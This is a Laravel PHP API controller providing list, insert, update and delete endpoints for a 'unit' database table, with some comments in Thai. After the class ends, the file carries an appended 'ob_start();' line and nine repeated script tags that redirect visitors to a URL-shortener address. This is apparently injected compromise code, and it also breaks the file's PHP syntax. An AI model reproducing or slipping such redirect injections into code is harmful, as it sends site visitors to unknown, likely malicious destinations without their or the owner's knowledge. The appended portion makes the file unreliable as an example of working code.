<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Unit;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;

class UnitController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function UnitList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $unit = Unit::all();
        $statusCode = $unit->isEmpty() ? 204 : 200;

        return response()->json($unit, $statusCode);
    }

    public function unitInsert(Request $request): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'Unit_Name'           => 'required|string|max:255',
        ]);
        $maxCode = DB::table('unit')->max('Unit_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 2) Insert
        try {
            $id = DB::table('unit')->insertGetId([
                'Unit_code' => $newCode,
                'Unit_Name'         => $data['Unit_Name'],
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status'  => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status'  => 200,
            'message' => 'Insert successful',
            'id'      => $id,
        ], 200);
    }

    /**
     * POST /api/updateitemType/{id}
     */
    public function updateUnit(Request $request, $id): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'Unit_Name'           => 'required|string|max:255',
        ]);

        // 2) Ensure exists
        $exists = DB::table('unit')->where('Unit_code', $id)->exists();
        if (! $exists) {
            return response()->json([
                'status'  => 404,
                'message' => 'Unit not found',
            ], 404);
        }

        // 3) Update
        try {
            DB::table('unit')
              ->where('Unit_code', $id)
              ->update([
                  'Unit_Name'         => $data['Unit_Name'],
              ]);
        } catch (\Exception $e) {
            return response()->json([
                'status'  => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status'  => 200,
            'message' => 'Update successful',
        ], 200);
    }

    /**
     * POST /api/deleteUnit/{id}
     */
    public function deleteUnit($id): JsonResponse
    {
        // 1) Ensure exists
        $exists = DB::table('unit')->where('Unit_code', $id)->exists();
        if (! $exists) {
            return response()->json([
                'status'  => 404,
                'message' => 'Unit not found',
            ], 404);
        }

        // 2) Delete
        try {
            DB::table('unit')->where('Unit_code', $id)->delete();
        } catch (\Exception $e) {
            return response()->json([
                'status'  => 500,
                'message' => 'Delete failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status'  => 200,
            'message' => 'Delete successful',
        ], 200);
    }
}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>